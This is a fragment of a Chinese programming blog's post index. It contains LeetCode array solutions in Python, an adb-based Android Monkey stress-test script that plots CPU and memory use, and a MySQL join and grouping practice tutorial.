class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    data = [1,3,7,8,6,5]</span><br><span class="line">    t = Solution().pivotIndex1(data)</span><br><span class="line">    print(t)</span><br></pre></td></tr></table></figure>

<h2 id="解体思路2"><a href="#解体思路2" class="headerlink" title="解体思路2"></a>解体思路2</h2><p>两次遍历，第一次遍历先求出数组全部元素和。第二次遍历找到左侧元素和恰好为全部元素和一半的位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def pivotIndex(self, nums):</span><br><span class="line">        # 得到数组的总数</span><br><span class="line">        sum = 0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            sum += nums[i]</span><br><span class="line"></span><br><span class="line">        # 左侧之和</span><br><span class="line">        curr_sum = 0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            # 索引值+2*索引左边之和=数组总和</span><br><span class="line">            if curr_sum * 2 + nums[i] == sum:</span><br><span class="line">                return i</span><br><span class="line">            # 累加左侧之和</span><br><span class="line">            curr_sum += nums[i]</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    data = [1,3,7,8,6,5]</span><br><span class="line">    t = Solution().pivotIndex(data)</span><br><span class="line">    print(t)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>leetcode-数组</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-66-加1</title>
    <url>/aposts/9322dea6/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本人零基础，数学基础极差，此系列开始学习下leetcode算法方面的题目</li>
<li>都是leetcode的原题</li>
</ul>
<h2 id="0066-加一"><a href="#0066-加一" class="headerlink" title="0066. 加一"></a>0066. 加一</h2><ul>
<li>难度：简单</li>
<li>标签：数组</li>
<li>本题来自<a href="https://leetcode-cn.com/problems/plus-one/">这里</a></li>
</ul>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><ul>
<li><p>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一。</p>
</li>
<li><p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。</p>
</li>
<li><p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>
</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：digits = [1,2,3]</span><br><span class="line">输出：[1,2,4]</span><br><span class="line">解释：输入数组表示数字 123。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：digits = [4,3,2,1]</span><br><span class="line">输出：[4,3,2,2]</span><br><span class="line">解释：输入数组表示数字 4321。</span><br></pre></td></tr></table></figure>


<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：digits = [0]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure>

<h2 id="解体思路"><a href="#解体思路" class="headerlink" title="解体思路"></a>解体思路</h2><ul>
<li><p>这道题把整个数组看成了一个整数，然后个位数 +1。问题的实质是利用数组模拟加法运算。</p>
</li>
<li><p>如果个位数不为 9 的话，直接把个位数 +1 就好。如果个位数为 9 的话，还要考虑进位。</p>
</li>
<li><p>还有一个注意的点：首位进位变成10之后也需要进行处理，因为会多一位数字</p>
</li>
</ul>
<h2 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def plusOne(self, digits):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type digits: List[int]</span><br><span class="line">        :rtype: List[int]</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 最后一位值+1</span><br><span class="line">        digits[len(digits) - 1] += 1</span><br><span class="line">        # 以-1不停递减直到0，初始化值为最后一位索引</span><br><span class="line">        for i in range(len(digits) - 1, 0, -1):</span><br><span class="line">            # 末尾索引的值不为10，就退出循环</span><br><span class="line">            if digits[i] != 10:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                # 末尾的值为10，就把赋值为0</span><br><span class="line">                digits[i] = 0</span><br><span class="line">                # 末尾-1后的索引值+1</span><br><span class="line">                digits[i - 1] += 1</span><br><span class="line"></span><br><span class="line">        # 如果首位为10</span><br><span class="line">        if digits[0] == 10:</span><br><span class="line">            # 首位赋值为1</span><br><span class="line">            digits[0] = 1</span><br><span class="line">            # 在第二位新增值为0</span><br><span class="line">            digits.append(0)</span><br><span class="line">        return digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    data = [9,9,9]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1, 0, 0, 0]</span><br><span class="line"></span><br><span class="line"> 	data = [1,2,4]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1,2,5]</span><br><span class="line">    </span><br><span class="line">    data = [0]</span><br><span class="line">    t = Solution().plusOne(data)</span><br><span class="line">    print(t) # [1]</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>可以<a href="https://algo.itcharge.cn/">参考此系列</a>，刷算法</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>leetcode-数组</tag>
      </tags>
  </entry>
  <entry>
    <title>monkey压测曲线展示app性能图</title>
    <url>/aposts/d632d4bf/</url>
    <content><![CDATA[<p>局限性。</p>
<ul>
<li>Monkey测试使用的事件流数据流是随机的，不能进行自定义。</li>
<li>可对MonkeyTest的对象，事件数量，类型，频率等进行设置。</li>
</ul>
<h2 id="Monkey的基本用法"><a href="#Monkey的基本用法" class="headerlink" title="Monkey的基本用法"></a>Monkey的基本用法</h2><ul>
<li>基本语法如下：<ul>
<li>$ adb shell monkey [options]</li>
<li>如果不指定options，Monkey将以无反馈模式启动，并把事件任意发送到安装在目标环境中的全部包。下面是一个更为典型的命令行示例，它启动指定的应用程序，并向其发送500个伪随机事件：</li>
<li>$ adb shell monkey -p your.package.name -v 500</li>
</ul>
</li>
</ul>
<h2 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h2><ul>
<li>通过Android trace文件分析死锁ANR实例过程</li>
<li>system&#x2F;build.prop 日志文件主要记录手机系统信息，如版本，型号，品牌</li>
<li>adb logcat 导出日志文件</li>
</ul>
<h2 id="monkey-ini-配置文件"><a href="#monkey-ini-配置文件" class="headerlink" title="monkey.ini 配置文件"></a>monkey.ini 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=adb shell monkey -p com.dgm.user --throttle 500 --ignore-timeouts --ignore-crashes   --monitor-native-crashes -v -v</span><br><span class="line">package_name=com.dgm.user</span><br><span class="line">logdir=d:\android</span><br><span class="line">remote_path=d:\android_server</span><br><span class="line">phone_msg_log=d:\android_temp\phone.txt</span><br><span class="line">sum = 100 -</span><br><span class="line">activity = com.dgm.user.SplashActivity</span><br><span class="line">exceptions=[&#x27;NullPointer&#x27;,&#x27;IllegalState&#x27;,&#x27;IllegalArgument&#x27;,&#x27;ArrayIndexOutOfBounds&#x27;,&#x27;RuntimeException&#x27;,&#x27;SecurityException&#x27;] </span><br></pre></td></tr></table></figure>
<ul>
<li>throttle 每次事件等待500毫秒</li>
<li>sum 定义随机事件数</li>
<li>exceptions 异常定义，用于后面扩展</li>
</ul>
<h2 id="结果生成为可视化图片-使用的是matplotlib"><a href="#结果生成为可视化图片-使用的是matplotlib" class="headerlink" title="结果生成为可视化图片 使用的是matplotlib"></a>结果生成为可视化图片 使用的是matplotlib</h2><p><img src="/aposts/d632d4bf/image-20210930181002746.png" alt="image-20210930181002746"></p>
<ul>
<li>当然可以看日志文件</li>
</ul>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><ul>
<li>获得cpu-men</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import subprocess</span><br><span class="line">pkg_name = &quot;com.dgm.user&quot;</span><br><span class="line">cpu = []</span><br><span class="line">men = []</span><br><span class="line">def top_cpu(pkg_name):</span><br><span class="line">    cmd = &quot;adb shell dumpsys cpuinfo | grep &quot; + pkg_name</span><br><span class="line">    temp = []</span><br><span class="line">    # cmd = &quot;adb shell top -n %s -s cpu | grep %s$&quot; %(str(times), pkg_name)</span><br><span class="line">    top_info = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for info in top_info:</span><br><span class="line">        temp.append(info.split()[2].decode()) # bytes转换为string</span><br><span class="line">        # print(&quot;cpu占用:%s&quot; %cpu)</span><br><span class="line">    for i in temp:</span><br><span class="line">         if i != &quot;0%&quot;:</span><br><span class="line">            cpu.append(i.split(&quot;%&quot;)[0])</span><br><span class="line">    return cpu</span><br><span class="line"></span><br><span class="line">def get_men(pkg_name):</span><br><span class="line">    cmd = &quot;adb shell  dumpsys  meminfo %s&quot;  %(pkg_name)</span><br><span class="line">    print(cmd)</span><br><span class="line">    temp = []</span><br><span class="line">    m = []</span><br><span class="line">    men_s = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for info in men_s:</span><br><span class="line">        temp.append(info.split())</span><br><span class="line">        # print(&quot;内存占用:%s&quot; %men[19][1].decode()+&quot;K&quot;)</span><br><span class="line">    m.append(temp)</span><br><span class="line">    for t in m:</span><br><span class="line">        men.append(t[19][1].decode())</span><br><span class="line">    return men</span><br></pre></td></tr></table></figure>

<ul>
<li>入口代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import monkeyConfig</span><br><span class="line">from adb_common import AndroidDebugBridge as ai</span><br><span class="line">import matplotlibBase as mt</span><br><span class="line">import MenCpu as m</span><br><span class="line">import datetime as dt</span><br><span class="line">CPU = [[],[]] # time,使用情况</span><br><span class="line">MEN = [[],[]] #当前时间，和内存使用情况</span><br><span class="line"># 得到手机信息</span><br><span class="line">def getPhoneMsg(cmd_log):</span><br><span class="line">    l_list = []</span><br><span class="line">    f = open(cmd_log, &quot;r&quot;)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        line = line.split(&#x27;=&#x27;)</span><br><span class="line">        #Android 系统，如anroid 4.0</span><br><span class="line">        if (line[0] == &#x27;ro.build.version.release&#x27;):</span><br><span class="line">            l_list.append(line[1])</span><br><span class="line">            #手机名字</span><br><span class="line">        if (line[0]==&#x27;ro.product.model&#x27;):</span><br><span class="line">            l_list.append(line[1])</span><br><span class="line">            #手机品牌</span><br><span class="line">        if (line[0]==&#x27;ro.product.brand&#x27;):</span><br><span class="line">            l_list.append(line[1])</span><br><span class="line">    f.close()</span><br><span class="line">    return l_list</span><br><span class="line"></span><br><span class="line">#开始脚本测试</span><br><span class="line">def start_monkey(cmd, logdir, now1, logcatname):</span><br><span class="line">    print(cmd)</span><br><span class="line">    os.popen(cmd)</span><br><span class="line">    # os.kill()</span><br><span class="line">    #print&quot;使用Logcat导出日志&quot;</span><br><span class="line">    cmd2 = &quot;adb logcat -d &gt;%s&quot; % logcatname</span><br><span class="line">    os.popen(cmd2)</span><br><span class="line">    #print&quot;导出traces文件&quot;</span><br><span class="line">    tracesname = logdir + &quot;\\&quot; + now1 + r&quot;traces.log&quot;</span><br><span class="line">    cmd3 = &quot;adb shell cat /data/anr/traces.txt&gt;%s&quot; % tracesname</span><br><span class="line">    os.popen(cmd3)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    ini_file = &#x27;monkey.ini&#x27;</span><br><span class="line">    if os.path.isfile(ini_file):</span><br><span class="line">        if ai().attached_devices():</span><br><span class="line">            mc = monkeyConfig.baseReadnin(ini_file)</span><br><span class="line">            ai().open_app(mc.get_package_name(), mc.get_activity())</span><br><span class="line">            os.system(&#x27;adb shell cat /system/build.prop &gt;&#x27;+mc.get_phone_msg_log()) #存放的手机信息</span><br><span class="line">            ll_list = getPhoneMsg(mc.get_phone_msg_log())</span><br><span class="line">            # monkey开始测试</span><br><span class="line">            sum = mc.get_sum()</span><br><span class="line">            temp = &quot;&quot;</span><br><span class="line">            monkeylog = &quot;&quot;</span><br><span class="line">            start_monkey(mc.get_cmd(), mc.get_logdir(), mc.get_now(), mc.get_logcatname())</span><br><span class="line">            for i in range(sum):</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                print(i)</span><br><span class="line">                dn = dt.datetime.now()</span><br><span class="line">                CPU[0].append(dn)</span><br><span class="line">                m.top_cpu(mc.get_package_name())</span><br><span class="line">                MEN[0].append(dn)</span><br><span class="line">                m.get_men(mc.get_package_name())</span><br><span class="line">                monkeylog = open(mc.get_logdir() + &quot;\\&quot; + mc.get_now()+&quot;monkey.log&quot;)</span><br><span class="line">                temp = monkeylog.read()</span><br><span class="line">                monkeylog.close()</span><br><span class="line">                if temp.count(&#x27;Monkey finished&#x27;)&gt;0:</span><br><span class="line">                    print(&quot;测试完成咯&quot;)</span><br><span class="line">                    CPU[1].append(m.cpu)</span><br><span class="line">                    MEN[1].append(m.men)</span><br><span class="line">                    # geterror(ll_list, mc.get_log(), mc.get_remote_path(), mc.now) 错误显示</span><br><span class="line">                    mt.cpu_men_plots(CPU, MEN)</span><br><span class="line">                    break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;设备不存在&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(u&quot;配置文件不存在&quot;+ini_file)</span><br></pre></td></tr></table></figure>

<ul>
<li>结果以曲线图展示<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def cpu_men_plots(cpu, men):</span><br><span class="line">    import matplotlib.pyplot as pl</span><br><span class="line">    import matplotlib.dates as mdates</span><br><span class="line">    import datetime</span><br><span class="line"></span><br><span class="line">    # 处理异常数据，有时候得到数据(占用情况)会比时间多一次循环的数据，造成xy的数据不一致，而引起报错</span><br><span class="line">    if len(cpu[0]) != len(cpu[1][0]):</span><br><span class="line">        cpu[1][0]= cpu[1][0][0:len(cpu[0])]</span><br><span class="line"></span><br><span class="line">    if len(men[0]) != len(men[1][0]):</span><br><span class="line">        men[1][0]= men[1][0][0:len(men[0])]</span><br><span class="line">    print(men[0])</span><br><span class="line">    print(men[1][0])</span><br><span class="line">    a1 = pl.subplot(311)</span><br><span class="line">    a1.set_title(&quot;CPU&quot;)</span><br><span class="line">    a1.set_ylabel(&quot;占用情况%&quot;)</span><br><span class="line">    a1.plot(cpu[0], cpu[1][0])</span><br><span class="line">    a1.xaxis.set_major_locator(mdates.SecondLocator(interval=1))</span><br><span class="line">    a1.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line">    a2 = pl.subplot(312)</span><br><span class="line">    a2.set_title(&quot;内存&quot;)</span><br><span class="line">    a2.set_ylabel(&quot;使用情况 K&quot;)</span><br><span class="line">    a2.plot(men[0], men[1][0])</span><br><span class="line">    a2.xaxis.set_major_locator(mdates.SecondLocator(interval=2))</span><br><span class="line">    a2.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line">    # a3 = pl.subplot(313)</span><br><span class="line">    # a3.set_title(&quot;流量&quot;)</span><br><span class="line">    # a3.set_ylabel(&quot;使用情况 K&quot;)</span><br><span class="line">    # a3.plot(x,list2)</span><br><span class="line">    # a3.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line">    # a1.margins(x=0.2)</span><br><span class="line">    pl.tight_layout()</span><br><span class="line">    pl.show()</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="更多请参考我的源码"><a href="#更多请参考我的源码" class="headerlink" title="更多请参考我的源码"></a><a href="https://github.com/284772894/monkeyTest">更多请参考我的源码</a></h2>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql查询练习</title>
    <url>/aposts/a08a31/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>参考<a href="/aposts/3fcd402/">mysql安装详解</a></li>
</ul>
<h2 id="库表准备"><a href="#库表准备" class="headerlink" title="库表准备"></a>库表准备</h2><ul>
<li>创建一个数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE Educational;</span><br></pre></td></tr></table></figure>

<ul>
<li>创建学生表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use Educational </span><br><span class="line"></span><br><span class="line">CREATE TABLE student </span><br><span class="line">(</span><br><span class="line">ID CHAR(9) PRIMARY KEY, # PRIMARY KEY表示id为主键</span><br><span class="line">name VARCHAR(10),</span><br><span class="line">gender CHAR(6), # 性别</span><br><span class="line">birthdate date # 出生年月</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>创建课程表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE course</span><br><span class="line">(</span><br><span class="line"># 课程号,主键</span><br><span class="line">courseID CHAR(5) PRIMARY key,</span><br><span class="line"># 课程名</span><br><span class="line">coursename VARCHAR(36),</span><br><span class="line"># 课程简介</span><br><span class="line">Syllabus text,</span><br><span class="line"># 课时</span><br><span class="line">hours INT,</span><br><span class="line"># 学分</span><br><span class="line">credit TINYINT,</span><br><span class="line"># 开课学期</span><br><span class="line">semester text</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个成绩表，将学生表和课程表进行关联</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Score </span><br><span class="line">(</span><br><span class="line"># 学号,关联学生表中id,作为外键</span><br><span class="line">ID CHAR(9) REFERENCES student(ID),</span><br><span class="line"># 课程号.关联课程表中id,作为外键</span><br><span class="line">courseID CHAR(5) REFERENCES course(CourseID),</span><br><span class="line"># 成绩</span><br><span class="line">Results DECIMAL(4,1) CHECK(results BETWEEN 0 AND 100)</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>插入数据,学生表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES(&#x27;202201001&#x27;,&#x27;汤姆猫&#x27;,&#x27;男&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201002&#x27;,&#x27;风火轮&#x27;,&#x27;男&#x27;,&#x27;1998-11-03&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201003&#x27;,&#x27;闪光弹&#x27;,&#x27;女&#x27;,&#x27;2000-08-21&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201004&#x27;,&#x27;降世拳&#x27;,&#x27;女&#x27;,&#x27;2010-04-11&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201005&#x27;,&#x27;流星腿&#x27;,&#x27;女&#x27;,&#x27;2010-09-23&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201006&#x27;,&#x27;闪闪光&#x27;,&#x27;女&#x27;,&#x27;2010-02-02&#x27;);</span><br><span class="line">INSERT INTO student VALUES(&#x27;202201007&#x27;,&#x27;汤汤水&#x27;,&#x27;女&#x27;,&#x27;1999-03-29&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230612112157798.png" alt="image-20230612112157798"></p>
<ul>
<li>插入数据，课程表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO course VALUES(&#x27;10001&#x27;,&#x27;英语&#x27;, &#x27;英语简介介绍&#x27;,28,20,&#x27;2023-07-01&#x27;);</span><br><span class="line">INSERT INTO course VALUES(&#x27;10002&#x27;,&#x27;数学&#x27;, &#x27;英语简介介绍&#x27;,32,17,&#x27;2023-07-01&#x27;);</span><br><span class="line">INSERT INTO course VALUES(&#x27;10003&#x27;,&#x27;语文&#x27;, &#x27;语文简介介绍&#x27;,29,25,&#x27;2023-07-01&#x27;);</span><br><span class="line">INSERT INTO course VALUES(&#x27;10004&#x27;,&#x27;物理&#x27;, &#x27;物理简介介绍&#x27;,21,20,&#x27;2023-08-05&#x27;)</span><br><span class="line">INSERT INTO course VALUES(&#x27;10005&#x27;,&#x27;媒体&#x27;, &#x27;摄像媒体简介介绍&#x27;,13,12,&#x27;2023-08-01&#x27;);</span><br><span class="line">INSERT INTO course VALUES(&#x27;10006&#x27;,&#x27;java&#x27;, &#x27;java简介介绍&#x27;,17,5,&#x27;2023-08-11&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>插入数据，成绩表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Score VALUES(&#x27;202201001&#x27;,&#x27;10001&#x27;,89);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201002&#x27;,&#x27;10001&#x27;,76);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201003&#x27;,&#x27;10001&#x27;,99);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201004&#x27;,&#x27;10001&#x27;,88);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201005&#x27;,&#x27;10001&#x27;,59);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201006&#x27;,&#x27;10001&#x27;,69);</span><br><span class="line"></span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201001&#x27;,&#x27;10002&#x27;,80);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201002&#x27;,&#x27;10002&#x27;,77);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201003&#x27;,&#x27;10002&#x27;,92);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201004&#x27;,&#x27;10002&#x27;,83);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201005&#x27;,&#x27;10002&#x27;,56);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201006&#x27;,&#x27;10002&#x27;,100);</span><br><span class="line"></span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201001&#x27;,&#x27;10003&#x27;,81);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201002&#x27;,&#x27;10003&#x27;,72);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201003&#x27;,&#x27;10003&#x27;,63);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201004&#x27;,&#x27;10003&#x27;,81);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201005&#x27;,&#x27;10003&#x27;,55);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201006&#x27;,&#x27;10003&#x27;,93);</span><br><span class="line"></span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201001&#x27;,&#x27;10004&#x27;,82);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201002&#x27;,&#x27;10004&#x27;,71);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201003&#x27;,&#x27;10004&#x27;,96);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201004&#x27;,&#x27;10004&#x27;,75);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201005&#x27;,&#x27;10004&#x27;,58);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201006&#x27;,&#x27;10004&#x27;,89);</span><br><span class="line"></span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201001&#x27;,&#x27;10005&#x27;,91);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201002&#x27;,&#x27;10005&#x27;,86);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201003&#x27;,&#x27;10005&#x27;,97);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201004&#x27;,&#x27;10005&#x27;,38);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201005&#x27;,&#x27;10005&#x27;,61);</span><br><span class="line">INSERT INTO Score VALUES(&#x27;202201006&#x27;,&#x27;10005&#x27;,18);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><ul>
<li>基础语法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 查询列表</span><br><span class="line">from 表1 别名，表2 别名</span><br><span class="line">where 表1.key=表2.key</span><br><span class="line">【and 筛选条件】</span><br><span class="line">【group by 分组字段】</span><br><span class="line">【having 分组后的筛选】</span><br><span class="line">【order by 排序字段】</span><br></pre></td></tr></table></figure>

<ul>
<li><p>关于group by 分组的理解</p>
<ul>
<li>合并数据，比如张三有两条数据分别为100,20，合并后就成了120</li>
<li>在使用聚合函数，如sum,avg等需要分组，比如张三有对应两条数据为10和20，李四对应两条数据为10和10，使用avg 求平均值时</li>
</ul>
<p><strong>不分组</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,avg(num),count(1) from table </span><br><span class="line"># 若不分组就是整张表的平均值，即：（10+20+10+10）/4=12.5</span><br><span class="line">#  count(1)，则是统计表中数据行，上述计算出为4</span><br><span class="line"># 而这里的name则是读取表中一条数据，张三</span><br><span class="line"></span><br><span class="line">张三  12.5  4</span><br></pre></td></tr></table></figure>

<p><strong>分组</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,avg(num),count(1) from table group name</span><br><span class="line"># 首先对张三、李四进行分组，各自的数据为10+20=30、10+10=20</span><br><span class="line"># 然后对分组后的数据进行平均计算，30/2=15、10/2=10</span><br><span class="line">张三 15 2</span><br><span class="line">李四 10 2</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul>
<li>不及格的学生姓名，性别，科目，分数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.name, student.gender,course.coursename, score.Results FROM score, student,course WHERE score.ID=student.ID AND score.courseID=course.courseID and Results &lt;=60</span><br></pre></td></tr></table></figure>



<p><img src="/aposts/a08a31/image-20230614154352090.png" alt="image-20230614154352090"></p>
<ul>
<li>查询所有学生共参加了几门考试的信息，并且分数大于80，<strong>一定要分组,不分组就是查询的共有多少人参加了考试</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.ID,student.name,COUNT(1) FROM student,score WHERE student.ID = score.ID AND score.Results&gt;80 GROUP BY student.ID</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614154417658.png" alt="image-20230614154417658"></p>
<ul>
<li>计算当前学生所有成绩的总分，<strong>使用的左连接</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.name,sum(score.Results),COUNT(1) FROM score LEFT JOIN student on score.ID=student.ID GROUP BY student.ID</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614154453362.png" alt="image-20230614154453362"></p>
<ul>
<li>计算当前学生所有成绩的总分大于300的信息，<strong>分组后，使用having sum</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.name,sum(score.Results),COUNT(1) FROM score LEFT JOIN student on score.ID=student.ID GROUP BY student.ID HAVING SUM(score.Results)&gt;90</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614154545101.png" alt="image-20230614154545101"></p>
<ul>
<li>查询当前分数最高的学生名字、科目。<strong>注意这里and results&#x3D; 使用了子查询</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.name,course.coursename,results from course,score, student WHERE course.courseID=score.courseID AND student.ID=score.ID and results=(SELECT MAX(score.Results) FROM score)</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614160341440.png" alt="image-20230614160341440"></p>
<ul>
<li>查询各个科目的平均成绩</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select course.coursename,avg(score.Results),COUNT(1) FROM course  JOIN score ON course.courseID = score.courseID GROUP BY course.courseID</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614160434587.png" alt="image-20230614160434587"></p>
<ul>
<li>查询某个学生共参加了几门考试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT student.name,count(score.Results) FROM student,score WHERE student.name=&quot;汤姆猫&quot; AND student.ID=score.ID</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看学生成绩总分为前三的数据。<strong>先对学生进行分组，然后用sum计算所有分数，然后取前3条数据</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT stu.name, sum(sc.Results) FROM student stu ,score sc WHERE sc.ID=stu.ID GROUP BY stu.ID ORDER BY sum(sc.Results) DESC LIMIT 3</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/a08a31/image-20230614160553477.png" alt="image-20230614160553477"></p>
<ul>
